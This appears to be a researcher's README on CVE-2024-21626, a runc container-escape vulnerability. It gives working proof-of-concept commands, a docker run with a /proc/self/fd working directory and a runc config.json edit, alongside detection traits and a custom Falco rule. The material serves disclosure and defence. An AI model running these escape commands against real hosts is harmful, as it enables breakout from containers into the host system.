# CVE-2024-21626

For detailed explanation for this vulnerability, plz refer to [my article](https://nitroc.org/en/posts/cve-2024-21626-illustrated/).

## Exploit

### Exploit via Running a Container

No need to build a custom image, just run a container with `-w` parameter:

```shell
docker run -w /proc/self/fd/8 --name cve-2024-21626 --rm -it debian:bookworm
```

![exploit via running a container](./images/escape-via-crafted-image.gif)

### Exploit via Execing into a Running Container

![Exploit via execing into a running container](./images/escape-via-exec.gif)

### Exploit via runc itself

``` shell
~/container/runc/runc --version
docker run --name helper-ctr alpine
docker export helper-ctr --output alpine.tar
mkdir rootfs
tar xf alpine.tar -C rootfs
~/container/runc/runc spec
sed -ri 's#(\s*"cwd": )"(/)"#\1 "/proc/self/fd/7"#g' config.json
grep cwd config.json
sudo ~/container/runc/runc --log ./log.json run demo
```

![Exploit via runc itself](./images/reproduce-via-runc.gif)

## How to detect

The exploits have the following characteristics:

* A container will `execve(2)` a process with a special working directory which starts with `/proc/self/fd/`.
* A container will create symbolic links via `symlink(2)` or `symlinkat(2)` with a special target directory link which starts with `/proc/self/fd/`.
* A container will open files via `open(2)`, `openat(2)` or `openat2(2)` with filenames like `/proc/\d+/cwd/.*`.

### Leaky vessels dynamic detector from synk

https://github.com/snyk/leaky-vessels-dynamic-detector

### Falco

Here is the custom Falco rule:

```yaml
- macro: container
  condition: (container.id != host and container.name exists)

- rule: CVE-2024-21626 (runC escape through /proc/[PID]/cwd) exploited
  desc: >
    Detect CVE-2024-21626, runC escape vulerability through /proc/[PID]/cwd.
  condition: >
    container and ((evt.type = execve and proc.cwd startswith "/proc/self/fd") or (evt.type in (open, openat, openat2) and fd.name glob "/proc/*/cwd/*") or (evt.type in (symlink, symlinkat) and fs.path.target startswith "/proc/self/fd/")) and proc.name != "runc:[1:CHILD]"
  output: CVE-2024-21626 exploited (%container.info evt_type=%evt.type process=%proc.name command=%proc.cmdline target=%fs.path.targetraw)
  priority: CRITICAL
```

But filtering false positives with `proc.name` is not a good idea.

![detect exploits with Falco](./images/detect-via-falco.gif)

# References

* https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv
* https://github.com/opencontainers/runc/commit/8e1cd2f56d518f8d6292b8bb39f0d0932e4b6c2a
* https://github.com/opencontainers/runc/commit/f2f16213e174fb63e931fe0546bbbad1d9bbed6f
* https://github.com/opencontainers/runc/commit/89c93ddf289437d5c8558b37047c54af6a0edb48
* https://github.com/opencontainers/runc/commit/ee73091a8d28692fa4868bac81aa40a0b05f9780
* https://access.redhat.com/security/cve/cve-2024-21626
* https://github.com/snyk/leaky-vessels-dynamic-detector
* https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/
* https://nvd.nist.gov/vuln/detail/CVE-2024-21626
* https://github.com/snyk/leaky-vessels-dynamic-detector